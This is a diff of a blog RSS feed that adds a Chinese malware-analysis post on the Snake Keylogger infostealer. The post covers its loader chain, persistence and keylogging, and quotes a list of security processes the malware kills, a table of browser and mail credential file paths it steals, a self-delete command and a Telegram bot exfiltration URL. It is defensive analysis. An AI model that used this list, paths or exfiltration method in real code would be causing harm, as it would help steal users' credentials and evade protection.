@@ -5,8 +5,441 @@
 		<description>Recent content in Mediums on alee</description>
 		<generator>Hugo -- gohugo.io</generator>
 		<language>zh-cn</language>
-		<lastBuildDate>Mon, 01 Nov 2021 15:45:24 +0800</lastBuildDate>
+		<lastBuildDate>Fri, 03 Dec 2021 10:36:39 +0800</lastBuildDate>
 		<atom:link href="https://www.a1ee.cn/medium/index.xml" rel="self" type="application/rss+xml" />
+		
+		<item>
+			<title>SnakeKeylogger</title>
+			<link>https://www.a1ee.cn/medium/snakekeylogger/</link>
+			<pubDate>Fri, 03 Dec 2021 10:36:39 +0800</pubDate>
+			
+			<guid>https://www.a1ee.cn/medium/snakekeylogger/</guid>
+			<description>SnakeKeylogger窃密木马样本分析 1. 样本简介 Snake Keylogger 是一种使用 .NET 开发的恶意软件。它于 2020 年末首次出现，专注于从受害者设备中窃取敏感信息，</description>
+			<content type="html"><![CDATA[<h1 id="snakekeylogger窃密木马样本分析">SnakeKeylogger窃密木马样本分析</h1>
+<h2 id="1-样本简介">1. 样本简介</h2>
+<p>Snake Keylogger 是一种使用 .NET 开发的恶意软件。它于 2020 年末首次出现，专注于从受害者设备中窃取敏感信息，包括保存的凭据、受害者的按键、受害者屏幕截图和剪贴板数据。</p>
+<p>2021 年 7 月，Snake Keylogger 首次进入 TOP 10 流行恶意软件家族报告，这意味着 Snake Keylogger 家族的影响力正在增加，并影响更多人的设备和敏感数据。</p>
+<h2 id="2-样本信息">2. 样本信息</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">文件类型</th>
+<th style="text-align:center">IOC</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">加载器[exe]</td>
+<td style="text-align:center">c78dc582473992e26b204107ae9352b0</td>
+</tr>
+<tr>
+<td style="text-align:center">解码器[dll]</td>
+<td style="text-align:center">A97E3D4031E7D3124037234524F09B21</td>
+</tr>
+<tr>
+<td style="text-align:center">释放器[dll]</td>
+<td style="text-align:center">22B8A62A20FC15FBC38E8D6899241E21</td>
+</tr>
+<tr>
+<td style="text-align:center">恶意载荷[exe]</td>
+<td style="text-align:center">2C0A0FBF42ABB838527D3C7F340B600C</td>
+</tr>
+</tbody>
+</table>
+<h2 id="3-样本分析">3. 样本分析</h2>
+<h3 id="31-基本信息">3.1. 基本信息</h3>
+<p>采用<code>PEStudio</code>查看样本信息。该样本是个<code>.NET</code>程序，原始名称为<code>ICustomFacto.exe</code>:</p>
+<p><img src="/snake_images/1488141151166.png" alt=""></p>
+<h3 id="32-分析样本加载器">3.2. 分析样本（加载器）</h3>
+<p>使用<code>dnSpy</code>加载样本，得知该样本存在一个长字符串<code>text</code>，并采用本地函数<code>TDesDecrypt</code>进行<code>DES</code>解码，密钥关键字为<code>97HSN5A4A5C4J75H7A7SH48T47QG5</code></p>
+<p><img src="/snake_images/4499242169592.png" alt=""></p>
+<p><code>TDesDecrypt</code>函数内容如下：</p>
+<p><img src="/snake_images/3338347157459.png" alt=""></p>
+<p>解码完成后，在<code>X0FT_FT2</code>函数中进行加载：</p>
+<p><img src="/snake_images/5274348177625.png" alt=""></p>
+<p>此处可以看到<code>S</code>的内容是一个<code>PE</code>文件的<code>DOS</code>头内容：<code>MZ</code></p>
+<p><img src="/snake_images/1615055166849.png" alt=""></p>
+<p>然后在<code>X0FT_FT1</code>函数中执行函数<code>Panamera.Porsche</code>：</p>
+<p><img src="/snake_images/2236550170294.png" alt=""></p>
+<h3 id="33-分析样本解码器">3.3. 分析样本（解码器）</h3>
+<p>通过字符串解密将<code>representative.dll</code>加载到内存中，通过执行<code>Panamera.Porsche</code>函数，来到<code>Guru</code>函数，该函数将随机休眠<code>38-47</code>秒，已逃避沙箱的在线监测：</p>
+<p><img src="/snake_images/3643758162603.png" alt=""></p>
+<p>然后在循环中读取<code>.Properties.Resources</code>的资源并解密、加载：</p>
+<p><img src="/snake_images/1249303190483.png" alt=""></p>
+<p><code>.Properties.Resources</code>的资源是一张图片，但显然并不是一张正常的图片，而是需要解码的加密代码：</p>
+<p><img src="/snake_images/5422816188087.png" alt=""></p>
+<p>先使用<code>Draw.cba</code>读取图片的二进制数：</p>
+<p><img src="/snake_images/3862723166830.png" alt=""></p>
+<p>然后再使用<code>Draw.fgh</code>进行解码，整理的解码密钥是<code>4A7667415244</code>：</p>
+<p><img src="/snake_images/1457124189270.png" alt=""></p>
+<h3 id="34-分析样本恶意载荷释放器">3.4. 分析样本（恶意载荷释放器）</h3>
+<p>通过解码器<code>representative.dll</code>的解码并加载，最终释放了<code>CF_Secretaria.dll</code>，但整个代码进行了混淆，难以阅读，且内部调试器也被禁用了：</p>
+<p><img src="/snake_images/3120447184406.png" alt=""></p>
+<p>通过对<code>CF_Secretaria.dll</code>的函数还原，可以看到一个有趣的点：<code>case 2U</code>:</p>
+<p><img src="/snake_images/5470746111170.png" alt=""></p>
+<p>该值所对应的函数主要功能是注入，且代码对象是<code>Reuniao.int_0</code>，深入函数内部可以看到其中调用了两个函数：<code>Reuniao.Execute</code>、<code>Reuniao.GetInjectionPath</code></p>
+<p><img src="/snake_images/3525948129596.png" alt=""></p>
+<p>在<code>Reuniao.Execute</code>函数中可以看到如下的长度计算函数，其中<code>payload</code>可能就藏着恶意载荷：</p>
+<p><img src="/snake_images/2897415147463.png" alt=""></p>
+<p>虽然在<code>CF_Secretaria.dll</code>无法获取到局部变量的内容，但跳转到系统<code>API</code>时是可以查看变量名的， <code>_BitConToInt32</code>所调用的<code>BitConverter.ToInt32</code>参数<code>value</code>中存储的是<code>MZ</code>标识的<code>PE</code>文件：</p>
+<p><img src="/snake_images/539118160298.png" alt=""></p>
+<h3 id="35-分析样本恶意载荷">3.5. 分析样本（恶意载荷）</h3>
+<p>将上述内存中的<code>PE</code>文件保存下来，使用<code>PEStudio</code>查看：</p>
+<p><img src="/snake_images/5007621156853.png" alt=""></p>
+<p>文件经过混淆，去除混淆后可确定该<code>PE</code>文件为最终恶意载荷，其中存在大量窃密行为：</p>
+<p><img src="/snake_images/2018756111171.png" alt=""></p>
+<p>功能函数预览：</p>
+<p><img src="/snake_images/2499500197630.png" alt=""></p>
+<p><img src="/snake_images/4233259167464.png" alt=""></p>
+<p>通过对函数的分析，可以得出样本存在以下功能：</p>
+<ol>
+<li><a href="#351-%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF">设置开机自启</a>；</li>
+<li><a href="#352-%E6%9D%80%E6%AD%BB%E9%98%B2%E6%8A%A4%E8%BF%9B%E7%A8%8B">杀死防护进程</a>；</li>
+<li><a href="#353--%E5%AE%9A%E6%97%B6%E6%88%AA%E5%8F%96%E5%B1%8F%E5%B9%95">定时截取屏幕</a>；</li>
+<li><a href="#354--%E6%8A%93%E5%8F%96%E6%8C%89%E9%94%AE%E8%AE%B0%E5%BD%95">抓取按键记录</a>；</li>
+<li><a href="#355--%E7%AA%83%E5%8F%96%E5%89%AA%E8%B4%B4%E6%9D%BF%E5%86%85%E5%AE%B9">窃取剪贴板内容</a>；</li>
+<li><a href="#356--%E7%AA%83%E5%8F%96%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE">窃取敏感数据</a>；</li>
+<li><a href="#357--%E5%AE%9A%E6%97%B6%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE">定时发送数据</a>；</li>
+<li><a href="#358--%E8%87%AA%E6%88%91%E5%88%A0%E9%99%A4%E5%8A%9F%E8%83%BD">自我删除功能</a>；</li>
+</ol>
+<h4 id="351-设置开机自启">3.5.1. 设置开机自启</h4>
+<p>通过修改注册表：<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>，实现开机自启功能：</p>
+<p><img src="/snake_images/3567936190299.png" alt=""></p>
+<h4 id="352-杀死防护进程">3.5.2. 杀死防护进程</h4>
+<p>该样本中存在<code>194</code>个进程目标，其中包含了杀毒软件和监控软件：</p>
+<pre><code>&quot;zlclient&quot;,&quot;egui&quot;,&quot;bdagent&quot;,&quot;npfmsg&quot;,&quot;olydbg&quot;,&quot;anubis&quot;,&quot;wireshark&quot;,&quot;avastui&quot;,&quot;_Avp32&quot;,&quot;vsmon&quot;,&quot;mbam&quot;,&quot;keyscrambler&quot;,&quot;_Avpcc&quot;,&quot;_Avpm&quot;,&quot;Ackwin32&quot;,&quot;Outpost&quot;,&quot;Anti-Trojan&quot;,&quot;ANTIVIR&quot;,&quot;Apvxdwin&quot;,&quot;ATRACK&quot;,&quot;Autodown&quot;,&quot;Avconsol&quot;,&quot;Ave32&quot;,&quot;Avgctrl&quot;,&quot;Avkserv&quot;,&quot;Avnt&quot;,&quot;Avp&quot;,&quot;Avp32&quot;,&quot;Avpcc&quot;,&quot;Avpdos32&quot;,&quot;Avpm&quot;,&quot;Avptc32&quot;,&quot;Avpupd&quot;,&quot;Avsched32&quot;,&quot;AVSYNMGR&quot;,&quot;Avwin95&quot;,&quot;Avwupd32&quot;,&quot;Blackd&quot;,&quot;Blackice&quot;,&quot;Cfiadmin&quot;,&quot;Cfiaudit&quot;,&quot;Cfinet&quot;,&quot;Cfinet32&quot;,&quot;Claw95&quot;,&quot;Claw95cf&quot;,&quot;Cleaner&quot;,&quot;Cleaner3&quot;,&quot;Defwatch&quot;,&quot;Dvp95&quot;,&quot;Dvp95_0&quot;,&quot;Ecengine&quot;,&quot;Esafe&quot;,&quot;Espwatch&quot;,&quot;F-Agnt95&quot;,&quot;Findviru&quot;,&quot;Fprot&quot;,&quot;F-Prot&quot;,&quot;F-Prot95&quot;,&quot;Fp-Win&quot;,&quot;Frw&quot;,&quot;F-Stopw&quot;,&quot;Iamapp&quot;,&quot;Iamserv&quot;,&quot;Ibmasn&quot;,&quot;Ibmavsp&quot;,&quot;Icload95&quot;,&quot;Icloadnt&quot;,&quot;Icmon&quot;,&quot;Icsupp95&quot;,&quot;Icsuppnt&quot;,&quot;Iface&quot;,&quot;Iomon98&quot;,&quot;Jedi&quot;,&quot;Lockdown2000&quot;,&quot;Lookout&quot;,&quot;Luall&quot;,&quot;MCAFEE&quot;,&quot;Moolive&quot;,&quot;Mpftray&quot;,&quot;N32scanw&quot;,&quot;NAVAPSVC&quot;,&quot;NAVAPW32&quot;,&quot;NAVLU32&quot;,&quot;Navnt&quot;,&quot;NAVRUNR&quot;,&quot;Navw32&quot;,&quot;Navwnt&quot;,&quot;NeoWatch&quot;,&quot;NISSERV&quot;,&quot;Nisum&quot;,&quot;Nmain&quot;,&quot;Normist&quot;,&quot;NORTON&quot;,&quot;Nupgrade&quot;,&quot;Nvc95&quot;,&quot;Outpost&quot;,&quot;Padmin&quot;,&quot;Pavcl&quot;,&quot;Pavsched&quot;,&quot;Pavw&quot;,&quot;PCCIOMON&quot;,&quot;PCCMAIN&quot;,&quot;Pccwin98&quot;,&quot;Pcfwallicon&quot;,&quot;Persfw&quot;,&quot;POP3TRAP&quot;,&quot;PVIEW95&quot;,&quot;Rav7&quot;,&quot;Rav7win&quot;,&quot;Rescue&quot;,&quot;Safeweb&quot;,&quot;Scan32&quot;,&quot;Scan95&quot;,&quot;Scanpm&quot;,&quot;Scrscan&quot;,&quot;Serv95&quot;,&quot;Smc&quot;,&quot;SMCSERVICE&quot;,&quot;Snort&quot;,&quot;Sphinx&quot;,&quot;Sweep95&quot;,&quot;SYMPROXYSVC&quot;,&quot;Tbscan&quot;,&quot;Tca&quot;,&quot;Tds2-98&quot;,&quot;Tds2-Nt&quot;,&quot;TermiNET&quot;,&quot;Vet95&quot;,&quot;Vettray&quot;,&quot;Vscan40&quot;,&quot;Vsecomr&quot;,&quot;Vshwin32&quot;,&quot;Vsstat&quot;,&quot;Webscanx&quot;,&quot;WEBTRAP&quot;,&quot;Wfindv32&quot;,&quot;Zonealarm&quot;,&quot;LOCKDOWN2000&quot;,&quot;RESCUE32&quot;,&quot;LUCOMSERVER&quot;,&quot;avgcc&quot;,&quot;avgcc&quot;,&quot;avgamsvr&quot;,&quot;avgupsvc&quot;,&quot;avgw&quot;,&quot;avgcc32&quot;,&quot;avgserv&quot;,&quot;avgserv9&quot;,&quot;avgserv9schedapp&quot;,&quot;avgemc&quot;,&quot;ashwebsv&quot;,&quot;ashdisp&quot;,&quot;ashmaisv&quot;,&quot;ashserv&quot;,&quot;aswUpdSv&quot;,&quot;symwsc&quot;,&quot;norton&quot;,&quot;Norton Auto-Protect&quot;,&quot;norton_av&quot;,&quot;nortonav&quot;,&quot;ccsetmgr&quot;,&quot;ccevtmgr&quot;,&quot;avadmin&quot;,&quot;avcenter&quot;,&quot;avgnt&quot;,&quot;avguard&quot;,&quot;avnotify&quot;,&quot;avscan&quot;,&quot;guardgui&quot;,&quot;nod32krn&quot;,&quot;nod32kui&quot;,&quot;clamscan&quot;,&quot;clamTray&quot;,&quot;clamWin&quot;,&quot;freshclam&quot;,&quot;oladdin&quot;,&quot;sigtool&quot;,&quot;w9xpopen&quot;,&quot;Wclose&quot;,&quot;cmgrdian&quot;,&quot;alogserv&quot;,&quot;mcshield&quot;,&quot;vshwin32&quot;,&quot;avconsol&quot;,&quot;vsstat&quot;,&quot;avsynmgr&quot;,&quot;avcmd&quot;,&quot;avconfig&quot;,&quot;licmgr&quot;,&quot;sched&quot;,&quot;preupd&quot;,&quot;MsMpEng&quot;,&quot;MSASCui&quot;,&quot;Avira.Systray&quot;
+</code></pre><p><img src="/snake_images/5608937186854.png" alt=""></p>
+<h4 id="353--定时截取屏幕">3.5.3.  定时截取屏幕</h4>
+<p>样本中的<code>Timer1</code>的功能是截取屏幕：</p>
+<p><img src="/snake_images/3880141182608.png" alt=""></p>
+<p>截取屏幕的功能函数如下：</p>
+<p><img src="/snake_images/5349642200488.png" alt=""></p>
+<h4 id="354--抓取按键记录">3.5.4.  抓取按键记录</h4>
+<p>样本会新建一个线程，通过<code>KeyLogger</code>来实现按键抓取：
+<img src="/snake_images/43721611211242.png" alt=""></p>
+<p>通过调用<code>SetWindowsHookExA</code>和<code>CallNextHookEx</code>函数，抓取键的按下和弹起：</p>
+<p><img src="/snake_images/229354817216906.png" alt=""></p>
+<h4 id="355--窃取剪贴板内容">3.5.5.  窃取剪贴板内容</h4>
+<p>样本通过<code>Clipboard.GetText()</code>，从剪贴板中检索文本数据，并缓存在内存中：</p>
+<p><img src="/snake_images/586333311217535.png" alt=""></p>
+<p>然后由定时器，定时发送剪贴板内容：</p>
+<p><img src="/snake_images/228573811237701.png" alt=""></p>
+<p>其中<code>Class6.string_5</code>是获取的剪贴板内容，<code>Class6.string_8</code>中则是包含的<code>PC</code>相关信息（具体的方法将在下一小节详细说明）：</p>
+<p><img src="/snake_images/11144011230370.png" alt=""></p>
+<h4 id="356--窃取敏感数据">3.5.6.  窃取敏感数据</h4>
+<p><code>Snake</code>会获取当前时间、操作系统名称、操作系统版本、物理内存：</p>
+<p><img src="/snake_images/221285514226925.png" alt=""></p>
+<p>通过在主机上访问：<code>http://checkip.dyndns.org/</code>，从返回信息中提取本地的公网<code>IP</code>地址：</p>
+<p><img src="/snake_images/169722415211242.png" alt=""></p>
+<p>通过在主机上访问：<code>https://freegeoip.app/xml/</code>，从返回信息中提取<code>IP</code>地址所在的国家和地区：</p>
+<p><img src="/snake_images/406272715229668.png" alt=""></p>
+<p>在针对特定应用进行数据窃取时，<code>Snake</code>采用<code>Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)</code>和<code>Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)</code>方法获取<code>%LocalAppData%</code>和<code>%AppData%</code>的<code>Windows</code>环境变量，然后通过访问应用的缓存目录窃取数据。</p>
+<p><code>Snake</code>的窃取对象如下：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">应用名称</th>
+<th style="text-align:left">窃取目标</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>邮件应用</strong></td>
+<td style="text-align:left"></td>
+</tr>
+<tr>
+<td style="text-align:left">Outlook</td>
+<td style="text-align:left">HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676<!-- raw HTML omitted -->HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676<!-- raw HTML omitted -->HKEY_CURRENT_USER\Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676<!-- raw HTML omitted -->HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676</td>
+</tr>
+<tr>
+<td style="text-align:left">Foxmail</td>
+<td style="text-align:left">$FoxmailInstalPath\Storage$email\Accounts\Account.rec0</td>
+</tr>
+<tr>
+<td style="text-align:left">Thunderbird</td>
+<td style="text-align:left">%AppData%\Thunderbird\Profiles\logins.json</td>
+</tr>
+<tr>
+<td style="text-align:left">PostBox</td>
+<td style="text-align:left">%AppData%\PostboxApp\Profiles\logins.json</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>FTP 应用</strong></td>
+<td style="text-align:left"></td>
+</tr>
+<tr>
+<td style="text-align:left">FileZilla</td>
+<td style="text-align:left">%AppData%\FileZilla\recentservers.xml</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>社交软件</strong></td>
+<td style="text-align:left"></td>
+</tr>
+<tr>
+<td style="text-align:left">Pidgin</td>
+<td style="text-align:left">%AppData%.purple\accounts.xml</td>
+</tr>
+<tr>
+<td style="text-align:left">Discord</td>
+<td style="text-align:left">%AppData%\discord\Local Storage\leveldb*.log</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>浏览器</strong></td>
+<td style="text-align:left"></td>
+</tr>
+<tr>
+<td style="text-align:left">Yandex</td>
+<td style="text-align:left">%LocalAppData%\Yandex\YandexBrowser\User Data\Default\Ya Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Amigo</td>
+<td style="text-align:left">%LocalAppData%\Amigo\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Xpom</td>
+<td style="text-align:left">%LocalAppData%\Xpom\User Data\Deault\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Kometa</td>
+<td style="text-align:left">%LocalAppData%\Kometa\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Nichrome</td>
+<td style="text-align:left">%LocalAppData%\Nichrome\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Google Chrome</td>
+<td style="text-align:left">%LocalAppData%\Google\Chrome\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">CocCoc</td>
+<td style="text-align:left">%LocalAppData%\CocCoc\Browser\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">QQBrowser</td>
+<td style="text-align:left">%LocalAppData%\Tencent\QQBrowser\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Orbitum</td>
+<td style="text-align:left">%LocalAppData%\Orbitum\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Slimjet</td>
+<td style="text-align:left">%LocalAppData%\Slimjet\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Iridium</td>
+<td style="text-align:left">%LocalAppData%\Iridium\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Vivaldi</td>
+<td style="text-align:left">%LocalAppData%\Vivaldi\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Iron</td>
+<td style="text-align:left">%LocalAppData%\Chromium\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Chromium</td>
+<td style="text-align:left">%LocalAppData%\Chromium\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Ghost</td>
+<td style="text-align:left">%LocalAppData%\GhostBrowser\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Cent</td>
+<td style="text-align:left">%LocalAppData%\CentBrowser\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Xvast</td>
+<td style="text-align:left">%LocalAppData%\Xvast\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Chedot</td>
+<td style="text-align:left">%LocalAppData%\Chedot\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">SuperBird</td>
+<td style="text-align:left">%LocalAppData%\SuperBird\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">360Browser</td>
+<td style="text-align:left">%LocalAppData%\360Browser\Browser\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">360Chrome</td>
+<td style="text-align:left">%LocalAppData%\360Chrome\Chrome\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Comodo</td>
+<td style="text-align:left">%LocalAppData%\Comodo\Dragon\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Brave</td>
+<td style="text-align:left">%LocalAppData%\BraveSoftware\Brave-Browser\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Torch</td>
+<td style="text-align:left">%LocalAppData%\Torch\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">UCBrowser</td>
+<td style="text-align:left">%LocalAppData%\UCBrowser\User Data_i18n\Default\UC Login Data.18</td>
+</tr>
+<tr>
+<td style="text-align:left">Blisk</td>
+<td style="text-align:left">%LocalAppData%\Blisk\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Epic</td>
+<td style="text-align:left">%LocalAppData%\Epic Privacy Browser\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Opera</td>
+<td style="text-align:left">%AppData%\Opera Software\Opera Stable\Login Data<!-- raw HTML omitted -->%AppData%\Opera\Opera\profile\wand.dat</td>
+</tr>
+<tr>
+<td style="text-align:left">Liebao</td>
+<td style="text-align:left">%LocalAppData%\Liebao7\User Data\Default\EncryptedStorage</td>
+</tr>
+<tr>
+<td style="text-align:left">Avast</td>
+<td style="text-align:left">%LocalAppData%\AVAST Software\Browser\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Kinza</td>
+<td style="text-align:left">%LocalAppData%\Kinza\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">BlackHawk</td>
+<td style="text-align:left">%LocalAppData%\BlackHawk\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Citrio</td>
+<td style="text-align:left">%LocalAppData%\CatalinaGroup\Citrio\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Uran</td>
+<td style="text-align:left">%LocalAppData%\uCozMedia\Uran\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Coowon</td>
+<td style="text-align:left">%LocalAppData%\Coowon\Coowon\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">7Star</td>
+<td style="text-align:left">%LocalAppData%\7Star\7Star\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">QIP Surf</td>
+<td style="text-align:left">%LocalAppData%\QIP Surf\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Sleipnir</td>
+<td style="text-align:left">%AppData%\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Chrome Canary</td>
+<td style="text-align:left">%LocalAppData%\Google\Chrome SxS\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">CoolNovo</td>
+<td style="text-align:left">%LocalAppData%\MapleStudio\ChromePlus\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">SalamWeb</td>
+<td style="text-align:left">%LocalAppData%\SalamWeb\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Sputnik</td>
+<td style="text-align:left">%LocalAppData%\Sputnik\Sputnik\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Falkon</td>
+<td style="text-align:left">%LocalAppData%\Sputnik\Sputnik\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Elements</td>
+<td style="text-align:left">%LocalAppData%\Elements Browser\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">Edge Chromium</td>
+<td style="text-align:left">%LocalAppData%\Microsoft\Edge\User Data\Default\Login Data</td>
+</tr>
+<tr>
+<td style="text-align:left">IceCat</td>
+<td style="text-align:left">%AppData%Mozilla\icecat\Profiles\logins.json</td>
+</tr>
+<tr>
+<td style="text-align:left">Slim</td>
+<td style="text-align:left">%AppData%FlashPeak\SlimBrowser\Profiles\logins.json</td>
+</tr>
+<tr>
+<td style="text-align:left">Firefox</td>
+<td style="text-align:left">%AppData%Mozilla\Firefox\Profiles\logins.json</td>
+</tr>
+<tr>
+<td style="text-align:left">SeaMonkey</td>
+<td style="text-align:left">%AppData%Mozilla\SeaMonkey\Profiles\logins.json</td>
+</tr>
+<tr>
+<td style="text-align:left">Ice Dragon</td>
+<td style="text-align:left">%AppData%Comodo\IceDragon\Profiles\logins.json</td>
+</tr>
+<tr>
+<td style="text-align:left">CyberFox</td>
+<td style="text-align:left">%AppData%8pecxstudios\Cyberfox\Profiles</td>
+</tr>
+<tr>
+<td style="text-align:left">PaleMoon</td>
+<td style="text-align:left">%AppData%Moonchild Productions\Pale Moon\Profiles\logins.json</td>
+</tr>
+<tr>
+<td style="text-align:left">WaterFox</td>
+<td style="text-align:left">%AppData%Waterfox\Profiles\logins.json</td>
+</tr>
+</tbody>
+</table>
+<p><strong>注：</strong> 对于<code>Iron</code>和<code>Falkon</code>明显路径错误，但作者的源代码中确实如此，大概是作者沉迷<code>copy</code>，忘了修改<code>-.-</code></p>
+<h4 id="357--定时发送数据">3.5.7.  定时发送数据</h4>
+<p>从源码中可以看到作者设定了<code>7</code>个定时器：</p>
+<p><img src="/snake_images/314473017217535.png" alt=""></p>
+<p><code>Time_0</code>：<code>Send keystroke Logs</code></p>
+<p><img src="/snake_images/61274217237701.png" alt=""></p>
+<p><code>Time_1</code>：<code>Send Screenshot Logs</code></p>
+<p><img src="/snake_images/72804517230370.png" alt=""></p>
+<p><code>Time_2</code>：<code>Get Clipboard Text</code></p>
+<p><img src="/snake_images/360704517226925.png" alt=""></p>
+<p><code>Time_3</code>：<code>Send Clipboard Logs</code></p>
+<p><img src="/snake_images/571014517222679.png" alt=""></p>
+<p><code>Time_4</code>：<code>Null</code></p>
+<p><img src="/snake_images/125024617240559.png" alt=""></p>
+<p><code>Time_5</code>：<code>Send Passwords</code></p>
+<p><img src="/snake_images/334874617238163.png" alt=""></p>
+<p><code>Time_6</code>：<code>Null</code></p>
+<p><img src="/snake_images/491184617235665.png" alt=""></p>
+<h4 id="358--自我删除功能">3.5.8.  自我删除功能</h4>
+<p>样本存在自我删除函数，当调用该函数三秒后，将进行自我删除。函数执行的命令是：<code>cmd.exe /C choice /C Y /N /D Y /T 3 &amp; Del &quot;Application.ExecutablePath&quot;</code></p>
+<p><img src="/snake_images/4012644198092.png" alt=""></p>
+<h4 id="359--发送函数解析">3.5.9.  发送函数解析</h4>
+<p>作者实现了三种模式用于发送窃取的数据：<code>FTP</code>、<code>SMTP</code>、<code>Telegram</code>。</p>
+<p><code>FTP</code>：登录到配置的<code>FTP</code>服务器，采用<code>STOR</code>命令将窃取的数据上传到服务器：</p>
+<p><img src="/snake_images/393440118239346.png" alt=""></p>
+<p><code>SMTP</code>：登录配置的<code>SMTP</code>服务器，然后向恶意电子邮件地址发送带有附件的电子邮件，附件存储窃取的数据：</p>
+<p><img src="/snake_images/590000218234482.png" alt=""></p>
+<p><code>Telegram</code>：向<code>Telegram</code>端点<code>api.telegram.org</code>发出<code>POST</code>请求，内容为窃取的数据内容：</p>
+<p><img src="/snake_images/359200518228028.png" alt=""></p>
+<p>在该样本中，作者写定了传输方式：<code>private static string string_4 = &quot;$%TelegramDv$&quot;;</code></p>
+<p>最终获取到<code>Telegram</code>会话链接为：<code>https://api.telegram.org/bot1846952933:AAEgp2ulfucRILQNH4ZSk6CAr7cPDJZxCPs/sendDocument?chat_id=840259816&amp;caption=***</code></p>
+<h2 id="4-参考资料">4. 参考资料</h2>
+<blockquote>
+<p><a href="https://www.cybereason.com/blog/threat-analysis-report-snake-infostealer-malware">https://www.cybereason.com/blog/threat-analysis-report-snake-infostealer-malware</a>
+<a href="https://www.virustotal.com/gui/file/132482335f028ceb6094d9c29442faf900d838fb054eebbbf39208bb39ccf5ae">https://www.virustotal.com/gui/file/132482335f028ceb6094d9c29442faf900d838fb054eebbbf39208bb39ccf5ae</a>
+<a href="https://app.any.run/tasks/345a0eae-3a65-4b1a-9719-45a23c751f92/#">https://app.any.run/tasks/345a0eae-3a65-4b1a-9719-45a23c751f92/#</a></p>
+</blockquote>
+]]></content>
+		</item>
 		
 		<item>
 			<title>RedLine</title>
